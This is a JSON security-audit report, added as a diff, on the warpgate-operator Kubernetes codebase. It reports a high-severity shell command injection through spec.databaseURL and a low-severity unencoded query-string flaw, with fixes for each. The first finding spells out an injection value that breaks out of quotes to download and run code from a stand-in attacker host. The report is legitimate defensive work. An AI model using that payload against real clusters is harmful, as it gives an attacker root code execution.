@@ -1,0 +1,51 @@
+{
+  "summary": "Reviewed the warpgate-operator Go codebase (a Kubernetes operator that provisions Warpgate bastion instances and manages Warpgate API objects). Focus was on internal/ (controllers and the Warpgate REST client), cmd/main.go, and api/v1alpha1 (CRD types and admission webhooks). The most serious issue is OS command injection: the WarpgateInstance controller interpolates the unvalidated spec.databaseURL field directly into a shell script executed by the init container. Other findings are lower-impact (unencoded query-parameter injection into the Warpgate API and unsanitized YAML config generation). Overall risk is moderate: the sharp edges are reachable by whoever may create/update WarpgateInstance and other Warpgate CRs in a namespace. Coverage was manual source reading; test files were not treated as in-scope targets.",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/ticket.go",
+    "internal/warpgate/parameters.go",
+    "internal/warpgate/role.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/bindings.go",
+    "internal/warpgate/target_group.go",
+    "api/v1alpha1/warpgateconnection_webhook.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateinstance_types.go"
+  ],
+  "findings": [
+    {
+      "title": "OS command injection via WarpgateInstance.spec.databaseURL in generated init-container script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a shell script from string fragments and runs it with `Command: []string{\"/bin/sh\", \"-c\", initScript}` (line 776) in the instance's init container. The attacker-controlled field inst.Spec.DatabaseURL is concatenated into that script inside double quotes via fmt.Sprintf(\" --database-url \\\"%s\\\"\", inst.Spec.DatabaseURL). DatabaseURL has no character validation: the CRD type (api/v1alpha1/warpgateinstance_types.go:85-86) only marks it +optional, and the admission webhook (api/v1alpha1/warpgateinstance_webhook.go) only emits a warning for it. A value such as `sqlite:/data/db\"; wget http://attacker/x -O /tmp/x; sh /tmp/x; echo \"` breaks out of the quotes and executes arbitrary commands as the init container's user (no securityContext is set, so typically root) with the pod's service account. Reachable by anyone who can create or update a WarpgateInstance in a namespace; it is also a way to achieve code execution under an otherwise policy-approved image, bypassing image allow-listing.",
+      "evidence": "setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup --data-path /data --http-port %d --admin-password \"${ADMIN_PASSWORD}\"`, instanceHTTPPort(inst))\n... \nif inst.Spec.DatabaseURL != \"\" {\n    setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL)   // line 557, unsanitized\n}\n...\ninitScript := strings.Join(scriptParts, \"\\n\")   // line 611\n...\nCommand: []string{\"/bin/sh\", \"-c\", initScript}   // line 776 \u2014 executed\n\nData flow: WarpgateInstance.Spec.DatabaseURL (CR, user-controlled; no Pattern validation) -> setupCmd -> scriptParts -> initScript -> /bin/sh -c. The same unvalidated field is also interpolated into generated YAML at buildWarpgateConfig (line 345, `database_url: \"%s\"`), and spec.externalHost is interpolated into YAML at line 380 (`external_host: %s`), allowing warpgate.yaml config injection via the same missing-validation root cause.",
+      "recommendation": "Do not build the setup command via shell string interpolation. Pass warpgate's setup as an argv slice (exec form) instead of `sh -c`, or supply DatabaseURL/admin values through environment variables / files that the program reads, so no value is parsed by a shell. If a shell is unavoidable, strictly validate spec.databaseURL and spec.externalHost in the admission webhook (allow-list a known URL/host grammar) and shell-quote any interpolated value. Apply the same validation before writing them into the generated warpgate.yaml."
+    },
+    {
+      "title": "Unencoded search string injected into Warpgate API query (ListUsers/ListRoles/ListTargets)",
+      "category": "security",
+      "cwe": "CWE-88",
+      "severity": "low",
+      "confidence": "medium",
+      "file": "internal/warpgate/user.go",
+      "line_start": 81,
+      "line_end": 83,
+      "description": "ListUsers builds the request path by concatenating the caller-supplied search term without URL/query encoding: `path += \"?search=\" + search`. The search value originates from CR-controlled fields (e.g. WarpgatePasswordCredential.spec.username resolved via GetUserByUsername -> ListUsers). Characters such as `&`, `#`, spaces, or `%` are not escaped, so a crafted name can inject additional query parameters into the Warpgate admin API request or corrupt the request. Impact is limited because GetUserByUsername re-checks for an exact username match on the returned list, but the pattern is incorrect and could cause request errors or unintended query behavior against the Warpgate API. The same unencoded pattern appears in internal/warpgate/role.go:62 and internal/warpgate/target.go:209.",
+      "evidence": "func (c *Client) ListUsers(search string) ([]User, error) {\n    path := \"/users\"\n    if search != \"\" {\n        path += \"?search=\" + search   // no url.QueryEscape\n    }\n    ...\n}\nSource: WarpgatePasswordCredential.Spec.Username -> GetUserByUsername(username) -> ListUsers(username).",
+      "recommendation": "Encode the value with url.QueryEscape (or build the query with url.Values / url.URL.RawQuery) before appending it, in ListUsers, ListRoles, and ListTargets."
+    }
+  ]
+}
